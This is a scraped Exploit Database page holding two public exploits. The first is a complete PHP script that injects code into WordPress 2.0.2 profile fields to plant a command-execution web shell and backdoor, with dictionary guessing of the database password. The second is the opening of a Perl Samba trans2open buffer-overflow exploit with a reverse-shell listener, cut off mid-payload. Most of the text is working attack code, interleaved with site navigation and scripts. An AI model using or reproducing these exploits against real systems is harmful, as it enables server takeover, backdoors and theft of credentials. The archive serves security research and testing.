'cache' Remote Shell InjectionEDB-ID:6CVE:2006-2667EDB Verified:Author:rgodType:webappsExploit:/Platform:PHPDate:2006-05-25Vulnerable App:Become a Certified Penetration TesterEnroll inAdvanced Web Attacks and Exploitation, the courserequired to become anOffensive Security Web Expert (OSWE)GET CERTIFIED#!/usr/bin/php -q -d short_open_tag=on<?echo "--------------------------------------------------------------------\r\n";echo "| WordPress <= 2.0.2 'cache' shell injection exploit               |\r\n";echo "| by rgod rgod@autistici.org                                       |\r\n";echo "| site: http://retrogod.altervista.org                             |\r\n";echo "| dork: inurl:wp-login.php Register Username Password -echo        |\r\n";echo "--------------------------------------------------------------------\r\n";/*this works:regardless of all php.ini settings,if user registration is enabled,against an empty or weak MySQL DB password (read explaination for details...)*/if ($argc<6) {echo "Usage: php ".$argv[0]." host path user pass cmd OPTIONS             \r\n";echo "host:      target server (ip/hostname)                              \r\n";echo "path:      path to WordPress                                        \r\n";echo "cmd:       a shell command                                          \r\n";echo "user/pass: you need a valid user account                            \r\n";echo "Options:                                                            \r\n";echo "   -D[dicrionary] specify a textfile and try dictionary attack      \r\n";echo "   -p[port]:        \"  a port other than 80                        \r\n";echo "   -P[ip:port]:     \"  a proxy                                     \r\n";echo "Examples:                                                           \r\n";echo "php ".$argv[0]." localhost /wordpress/ your_username password ls -la -Ddic.txt\r\n";echo "php ".$argv[0]." localhost /wordpress/ your_username password cat ./../../../wp-config.php -p81\r\n";echo "php ".$argv[0]." localhost / your_username password ls -la -P1.1.1.1:80\r\n\r\n";die;}/* explaination:i) wordpress stores some user informations inside cached filesin wp-content/cache/userlogins/ and wp-content/cache/users/ folders, they arephp files.Normally they look like this:<?php//O:8:"stdClass":23:{s:2:"ID";s:3:"106";s:10:"user_login";s:6:"suntzu";s:9:"user_pass";s:32:"a2b0f31cd94e749b58307775462e2e4b";s:13:"user_nicename";s:6:"suntzu";s:10:"user_email";s:18:"suntzoi@suntzu.org";s:8:"user_url";s:0:"";s:15:"user_registered";s:19:"2006-05-24 23:00:42";s:19:"user_activation_key";s:0:"";s:11:"user_status";s:1:"0";s:12:"display_name";s:6:"suntzu";s:10:"first_name";s:0:"";s:9:"last_name";s:0:"";s:8:"nickname";s:6:"suntzu";s:11:"description";s:0:"";s:6:"jabber";s:0:"";s:3:"aim";s:0:"";s:3:"yim";s:0:"";s:15:"wp_capabilities";a:1:{s:10:"subscriber";b:1;}s:13:"wp_user_level";s:1:"0";s:10:"user_level";s:1:"0";s:14:"user_firstname";s:0:"";s:13:"user_lastname";s:0:"";s:16:"user_description";s:0:"";}?>but...what happens if you inject a carriage return ( chr(13)...), some php code and someescape chars when you update your profile (ex. in "displayname" argument)?Look at this file now:<?php//O:8:"stdClass":24:{s:2:"ID";s:3:"106";s:10:"user_login";s:6:"suntzu";s:9:"user_pass";s:32:"a2b0f31cd94e749b58307775462e2e4b";s:13:"user_nicename";s:6:"suntzu";s:10:"user_email";s:17:"suntzu@suntzu.org";s:8:"user_url";s:7:"http://";s:15:"user_registered";s:19:"2006-05-24 23:00:42";s:19:"user_activation_key";s:0:"";s:11:"user_status";s:1:"0";s:12:"display_name";s:185:"suntzuerror_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()){$_REQUEST[cmd]=stripslashes($_REQUEST[cmd]);}echo 56789;passthru($_REQUEST[cmd]);echo 56789;//suntzuuuuuuuuuuuuuu";s:10:"first_name";s:6:"suntzu";s:9:"last_name";s:6:"suntzu";s:8:"nickname";s:6:"suntzu";s:11:"description";s:6:"whoami";s:6:"jabber";s:0:"";s:3:"aim";s:0:"";s:3:"yim";s:0:"";s:15:"wp_capabilities";a:1:{s:10:"subscriber";b:1;}s:13:"wp_user_level";s:1:"0";s:10:"user_level";s:1:"0";s:12:"rich_editing";s:4:"true";s:14:"user_firstname";s:6:"suntzu";s:13:"user_lastname";s:6:"suntzu";s:16:"user_description";s:6:"whoami";}?>you have a backdoor on target server...Now you have to search a way to guess filenames 'cause we have anindex.php to trivially protect folders, but... guess what?give a look at wp-includes/cache.php at line 355:...$cache_file = $group_dir.md5($id.DB_PASSWORD).'.php';...$group_dir is the folder where files are storedDB_PASSWORD costant could be empty, if so...you have only to calculate the md5 hash of your user id, then:http://[target]/[path]/wp-content/cache/users/[md5(user_id)].php?cmd=ls%20-lathe same with userlogins/ folder, this time:http://[target]/[path]/wp-content/cache/userlogins/[md5(username)].php?cmd=ls%20-laotherwise you can check if DB_PASSWORD is in a dictionary through the -D option,this tool calculate the hash to do something like this:http://[target]/[path]/wp-content/cache/users/[md5([user_id][db_pass])].php?cmd=ls%20-lahttp://[target]/[path]/wp-content/cache/userloginss/[md5([username][db_pass])].php?cmd=ls%20-laii) an ip-spoofing issue in vars.php:...// On OS X Server, $_SERVER['REMOTE_ADDR'] is the server's address. Workaround this// by using $_SERVER['HTTP_PC_REMOTE_ADDR'], which *is* the remote address.if ( isset($_SERVER['HTTP_PC_REMOTE_ADDR']) )$_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_PC_REMOTE_ADDR'];...poc:you can set an http header like this when you register:PC_REMOTE_ADDR: 1.1.1.1*/error_reporting(0);ini_set("max_execution_time",0);ini_set("default_socket_timeout",5);function quick_dump($string){$result='';$exa='';$cont=0;for ($i=0; $i<=strlen($string)-1; $i++){if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 )){$result.="  .";}else{$result.="  ".$string[$i];}if (strlen(dechex(ord($string[$i])))==2){$exa.=" ".dechex(ord($string[$i]));}else{$exa.=" 0".dechex(ord($string[$i]));}$cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}}return $exa."\r\n".$result;}$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';function sendpacketii($packet){global $proxy, $host, $port, $html, $proxy_regex;if ($proxy=='') {$ock=fsockopen(gethostbyname($host),$port);if (!$ock) {echo 'No response from '.$host.':'.$port; die;}}else {$c = preg_match($proxy_regex,$proxy);if (!$c) {echo 'Not a valid proxy...';die;}$parts=explode(':',$proxy);echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";$ock=fsockopen($parts[0],$parts[1]);if (!$ock) {echo 'No response from proxy...';die;}}fputs($ock,$packet);if ($proxy=='') {$html='';while (!feof($ock)) {$html.=fgets($ock);}}else {$html='';while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {$html.=fread($ock,1);}}fclose($ock);#debug#echo "\r\n".$html;}$host=$argv[1];$path=$argv[2];$username=$argv[3];$password=$argv[4];$cmd="";$port=80;$proxy="";$dict="";for ($i=5; $i<=$argc-1; $i++){$t=$argv[$i][0].$argv[$i][1];if (($t<>"-p") and ($t<>"-P") and ($t<>"-D")){$cmd.=" ".$argv[$i];}if ($t=="-p"){$port=str_replace("-p","",$argv[$i]);}if ($t=="-P"){$proxy=str_replace("-P","",$argv[$i]);}if ($t=="-D"){$dict=str_replace("-D","",$argv[$i]);}}$cmd=urlencode($cmd);if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}echo "step 0 -> check if suntzu.php is already installed...\r\n";$check=array("users/suntzu.php","userlogins/suntzu.php");for ($i=0; $i<=count($check)-1; $i++){$packet="GET ".$p."wp-content/cache/".$check[$i]." HTTP/1.0\r\n";$packet.="Host: ".$host."\r\n";$packet.="Cookie: cmd=".$cmd."\r\n";$packet.="Connection: close\r\n\r\n";sendpacketii($packet);if (strstr($html,"*DL*")){echo "Exploit succeeded...\r\n";$temp=explode("*DL*",$html);echo $temp[1]."\r\n";echo"Now you can launch commands through the followig url:\r\n http://".$host.$path."wp-content/cache/".$check[$i]."?cmd=ls%20-la";die;}}echo "step 1 -> Login ...\r\n";$data="log=".urlencode(trim($username));$data.="&pwd=".urlencode(trim($password));$data.="&rememberme=forever";$data.="&submit=".urlencode("Login &raquo;");$data.="&redirect_to=wp-admin";$packet="POST ".$p."wp-login.php HTTP/1.0\r\n";$packet.="PC_REMOTE_ADDR: 1.1.1.1\r\n"; //ip spoofing bug in vars.php ;)...$packet.="Content-Type: application/x-www-form-urlencoded\r\n";$packet.="Host: ".$host."\r\n";$packet.="Content-Length: ".strlen($data)."\r\n";$packet.="Connection: close\r\n\r\n";$packet.=$data;sendpacketii($packet);$temp=explode("Set-Cookie: ",$html);$temp2=explode(" ",$temp[1]);$cookie=$temp2[0];$temp2=explode(" ",$temp[2]);$cookie.=" ".$temp2[0];if ($cookie==''){echo "Unable to login...";die;}else {echo "cookie ->".$cookie."\r\n";}echo "step 2 -> Retrieve your user id...\r\n";$packet="GET ".$p."wp-admin/profile.php HTTP/1.0\r\n";$packet.="PC_REMOTE_ADDR: 1.1.1.1\r\n";$packet.="Host: ".$host."\r\n";$packet.="Cookie: ".$cookie."\r\n";$packet.="Connection: close\r\n\r\n";$packet.=$data;sendpacketii($packet);$temp=explode("checkuser_id\" value=\"",$html);$temp2=explode("\"",$temp[1]);$user_id=$temp2[0];if ($user_id==''){die("Unable to retrieve user id...\r\n");}else {echo "user id -> ".$user_id."\r\n";}echo "step 3 -> Update your profile with the evil code...\r\n";$suntzu='$fp=fopen("suntzu.php","w");fputs($fp,chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(114).chr(114).chr(111).chr(114).chr(95).chr(114).chr(101).chr(112).chr(111).chr(114).chr(116).chr(105).chr(110).chr(103).chr(40).chr(48).chr(41).chr(59).chr(115).chr(101).chr(116).chr(95).chr(116).chr(105).chr(109).chr(101).chr(95).chr(108).chr(105).chr(109).chr(105).chr(116).chr(40).chr(48).chr(41).chr(59).chr(105).chr(102).chr(32).chr(40).chr(103).chr(101).chr(116).chr(95).chr(109).chr(97).chr(103).chr(105).chr(99).chr(95).chr(113).chr(117).chr(111).chr(116).chr(101).chr(115).chr(95).chr(103).chr(112).chr(99).chr(40).chr(41).chr(41).chr(123).chr(36).chr(95).chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(91).chr(99).chr(109).chr(100).chr(93).chr(61).chr(115).chr(116).chr(114).chr(105).chr(112).chr(115).chr(108).chr(97).chr(115).chr(104).chr(101).chr(115).chr(40).chr(36).chr(95).chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(91).chr(99).chr(109).chr(100).chr(93).chr(41).chr(59).chr(125).chr(101).chr(99).chr(104).chr(111).chr(32).chr(34).chr(42).chr(68).chr(76).chr(42).chr(34).chr(59).chr(112).chr(97).chr(115).chr(115).chr(116).chr(104).chr(114).chr(117).chr(40).chr(36).chr(95).chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(91).chr(99).chr(109).chr(100).chr(93).chr(41).chr(59).chr(63).chr(62));fclose($fp);//';$suntzu=urlencode($suntzu);$code='error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()){$_REQUEST[cmd]=stripslashes($_REQUEST[cmd]);}echo chr(42).chr(68).chr(76).chr(42);passthru($_REQUEST[cmd]);echo chr(42).chr(68).chr(76).chr(42);';$code=urlencode($code);$data="from=profile";$data.="&checkuser_id=".$user_id;$data.="&user_login=".urlencode(trim($username));$data.="&first_name=".urlencode(trim($username));$data.="&last_name=".urlencode(trim($username)).chr(13).$suntzu."//suntzuuu";$data.="&nickname=".urlencode(trim($username));$data.="&display_name=".urlencode(trim($username)).chr(13).$code."//suntzuu";$data.="&email=".urlencode("suntzu@suntzu.org");$data.="&url=".urlencode("http://");$data.="&aim=";$data.="&yim=";$data.="&jabber=";$data.="&description=whoami";$data.="&rich_editing=true";$data.="&submit=".urlencode("Update Profile &raquo;");$packet="POST ".$p."wp-admin/profile-update.php HTTP/1.0\r\n";$packet.="PC_REMOTE_ADDR: 1.1.1.1\r\n";$packet.="Accept-Encoding: gzip, deflate\r\n";$packet.="Accept-Language: en\r\n";$packet.="Referer: http://".$host.$path."wp-admin/profile-update.php\r\n";$packet.="Content-Type: application/x-www-form-urlencoded\r\n";$packet.="Host: ".$host."\r\n";$packet.="Content-Length: ".strlen($data)."\r\n";$packet.="Cookie: ".$cookie."\r\n";$packet.="Connection: close\r\n\r\n";$packet.=$data;sendpacketii($packet);if (eregi("updated=true",$html)){echo "Done...\r\n";}else {die("Unable to update profile...");}echo "step 4 -> go to profile page to avoid cached files deletion...\r\n";$packet="GET ".$p."wp-admin/profile.php?updated=true HTTP/1.0\r\n";$packet.="PC_REMOTE_ADDR: 1.1.1.1\r\n";$packet.="Host: ".$host."\r\n";$packet.="Cookie: ".$cookie."\r\n";$packet.="Connection: close\r\n\r\n";sendpacketii($packet);if (eregi("200 OK",$html)){echo "Done...\r\n";}sleep(2);echo "step 5 -> check for an empty db password...\r\n";$check=array("users/".md5($user_id).".php","userlogins/".md5(trim($username)).".php");for ($i=0; $i<=count($check)-1; $i++){$packet="GET ".$p."wp-content/cache/".$check[$i]." HTTP/1.0\r\n";$packet.="Host: ".$host."\r\n";$packet.="Cookie: cmd=".$cmd."\r\n";$packet.="Connection: close\r\n\r\n";sendpacketii($packet);if (eregi("*DL*",$html)){echo "Exploit succeeded...\r\n";$temp=explode("*DL*",$html);echo($temp[1]);echo"\r\nNow you can launch commands through the followig urls:\r\n http://".$host.$path."wp-content/cache/".$check[$i]."?cmd=ls%20-la\r\nalso, you should have a backdoor called suntzu.php in the same folder\r\n";die;}}if ($dict=='') {echo "exploit failed...\r\n";}else{echo "step 6 -> trying with dictionary attack...\r\n";if (file_exists($dict)){$fp=fopen($dict,"r");while (!feof($fp)){$word=trim(fgets($fp));$check=array("users/".md5($user_id.$word).".php","userlogins/".md5(trim($username).$word).".php");for ($i=0; $i<=count($check)-1; $i++){echo "Trying with ".$check[$i]."\r\n";$packet="GET ".$p."wp-content/cache/".$check[$i]." HTTP/1.0\r\n";$packet.="Host: ".$host."\r\n";$packet.="Cookie: cmd=".$cmd."\r\n";$packet.="Connection: close\r\n\r\n";sendpacketii($packet);if (strstr($html,"*DL*")){echo "Exploit succeeded...\r\n";fclose($fp);$temp=explode("*DL*",$html);echo $temp[1];echo"Now you can launch commands through the followig url:\r\n http://".$host.$path."wp-content/cache/".$check[$i]."?cmd=ls%20-la\r\nalso, you should have a backdoor called suntzu.php in the same folder\r\n";die;}}}fclose($fp);//if you are here...echo "Exploit failed...\r\n";}else{die($dict."does not exist!");}}?># milw0rm.com [2006-05-25]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 7
Samba 2.2.x - Remote Buffer Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDSamba 2.2.x - Remote Buffer OverflowEDB-ID:7CVE:2003-0201EDB Verified:Author:H D MooreType:remoteExploit:/Platform:LinuxDate:2003-04-07Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl#################[ Header#         Name:  trans2root.pl#      Purpose:  Proof of concept exploit for Samba 2.2.x (trans2open overflow)#       Author:  H D Moore <hdmoore@digitaldefense.net>#    Copyright:  Copyright (C) 2003 Digital Defense Inc.#  trans2root.pl <options> -t <target type> -H <your ip> -h <target ip>##use strict;use Socket;use IO::Socket;use IO::Select;use POSIX;use Getopt::Std;$SIG{USR2} = \&GoAway;my %args;my %targets =("linx86"  => [0xbffff3ff, 0xbfffffff, 0xbf000000, 512, \&CreateBuffer_linx86],"solx86"  => [0x08047404, 0x08047ffc, 0x08010101, 512, \&CreateBuffer_solx86],"fbsdx86" => [0xbfbfefff, 0xbfbfffff, 0xbf000000, 512, \&CreateBuffer_bsdx86],# name      # default   # start     # end      # step  # function);getopt('t:M:h:p:r:H:P:', \%args);my $target_type = $args{t} || Usage();my $target_host = $args{h} || Usage();my $local_host  = $args{H} || Usage();my $local_port  = $args{P} || 1981;my $target_port = $args{p} || 139;my $target_mode = "brute";if (! exists($targets{$target_type})) { Usage(); }print "[*] Using target type: $target_type\n";# allow single mode via the -M optionif ($args{M} && uc($args{M}) eq "S"){$target_mode = "single";}# the parent process listens for an incoming connection# the child process handles the actual exploitationmy $listen_pid = $$;my $exploit_pid = StartListener($local_port);# get the default return address for single modemy $targ_ret = $args{r} || $targets{$target_type}->[0];my $curr_ret;$targ_ret = eval($targ_ret);if ($target_mode !~ /brute|single/){print "[*] Invalid attack mode: $target_mode (single or brute only)\n";exit(0);}if ($target_mode eq "single"){$curr_ret = $targ_ret;if(! $targ_ret){print "[*] Invalid return address specified!\n";kill("USR2", $listen_pid);exit(0);}print "[*] Starting single shot mode...\n";printf ("[*] Using return address of 0x%.8x\n", $targ_ret);my $buf = $targets{$target_type}->[4]->($local_host, $local_port, $targ_ret);my $ret = AttemptExploit($target_host, $target_port, $buf);sleep(2);kill("USR2", $listen_pid);exit(0);}if ($target_mode eq "brute"){print "[*] Starting brute force mode...\n";for ($curr_ret  =$targets{$target_type}->[1];$curr_ret >= $targets{$target_type}->[2];$curr_ret -=$targets{$target_type}->[3]){select(STDOUT); $|++;my $buf = $targets{$target_type}->[4]->($local_host, $local_port, $curr_ret);printf ("                                        \r[*] Return Address: 0x%.8x", $curr_ret);my $ret = AttemptExploit($target_host, $target_port, $buf);}sleep(2);kill("USR2", $listen_pid);exit(0);}sub Usage {print STDERR "\n";print STDERR " trans2root.pl - Samba 2.2.x 'trans2open()' Remote Exploit\n";print STDERR "===================================\n\n";print STDERR "    Usage: \n";print STDERR "           $0 <options> -t <target type> -H <your ip> -h <target ip>\n";print STDERR "  Options:  \n";print STDERR "           -M (S|B) <single or brute mode>\n";print STDERR "           -r       <return address for single mode>\n";print STDERR "           -p       <alternate Samba port>\n";print STDERR "           -P       <alternate listener port>\n";print STDERR "  Targets:\n";foreach my $type (keys(%targets)){print STDERR "            $type\n";}print STDERR "\n";exit(1);}sub StartListener {my ($local_port) = @_;my $listen_pid = $$;my $s = IO::Socket::INET->new (Proto => "tcp",LocalPort => $local_port,Type => SOCK_STREAM,Listen => 3,ReuseAddr => 1);if (! $s){print "[*] Could not start listener: $!\n";exit(0);}print "[*] Listener started on port $local_port\n";my $exploit_pid = fork();if ($exploit_pid){my $victim;$SIG{USR2} = \&GoAway;while ($victim = $s->accept()){kill("USR2", $exploit_pid);print STDOUT "\n[*] Starting Shell " . $victim->peerhost . ":" . $victim->peerport . "\n\n";StartShell($victim);}exit(0);}return ($exploit_pid);}sub StartShell {my ($client) = @_;my $sel = IO::Select->new();Unblock(*STDIN);Unblock(*STDOUT);Unblock($client);select($client); $|++;select(STDIN);   $|++;select(STDOUT);  $|++;$sel->add($client);$sel->add(*STDIN);print $client "echo \\-\\-\\=\\[ Welcome to `hostname` \\(`id`\\)\n";print $client "echo \n";while (fileno($client)){my $fd;my @fds = $sel->can_read(0.2);foreach $fd (@fds){my @in = <$fd>;if(! scalar(@in)) { next; }if (! $fd || ! $client){print "[*] Closing connection.\n";close($client);exit(0);}if ($fd eq $client){print STDOUT join("", @in);} else {print $client join("", @in);}}}close ($client);}sub AttemptExploit {my ($Host, $Port, $Exploit) = @_;my $res;my $s = IO::Socket::INET->new(PeerAddr => $Host, PeerPort => $Port, Type=> SOCK_STREAM, Protocol => "tcp");if (! $s){print "\n[*] Error: could not connect: $!\n";kill("USR2", $listen_pid);exit(0);}select($s); $|++;select(STDOUT); $|++;Unblock($s);my $SetupSession ="\x00\x00\x00\x2e\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x08"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x20\x02\x00\x01"."\x00\x00\x00\x00";my $TreeConnect ="\x00\x00\x00\x3c\xff\x53\x4d\x42\x70\x00\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00"."\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x5c\x5c\x69\x70\x63\x24"."\x25\x6e\x6f\x62\x6f\x64\x79\x00\x00\x00\x00\x00\x00\x00\x49\x50"."\x43\x24";my $Flush = ("\x00" x 808);print $s $SetupSession;$res = ReadResponse($s);print $s $TreeConnect;$res = ReadResponse($s);# uncomment this for diagnostics#print "[*] Press Enter to Continue...\n";#$res = <STDIN>;#print "[*] Sending Exploit Buffer...\n";print $s $Exploit;print $s $Flush;ReadResponse($s);close($s);}sub CreateBuffer_linx86 {my ($Host, $Port, $Return) = @_;my $RetAddr =  eval($Return);$RetAddr = pack("l", $RetAddr);my ($a1, $a2, $a3, $a4) = split(//, gethostbyname($Host));$a1 = chr(ord($a1) ^ 0x93);$a2 = chr(ord($a2) ^ 0x93);$a3 = chr(ord($a3) ^ 0x93);$a4 = chr(ord($a4) ^ 0x93);my ($p1, $p2) = split(//, reverse(pack("s", $Port)));$p1 = chr(ord($p1) ^ 0x93);$p2 = chr(ord($p2) ^ 0x93);my $exploit =# trigger the trans2open overflow"\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"."\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90".GetNops(772) .# xor decoder courtesy of 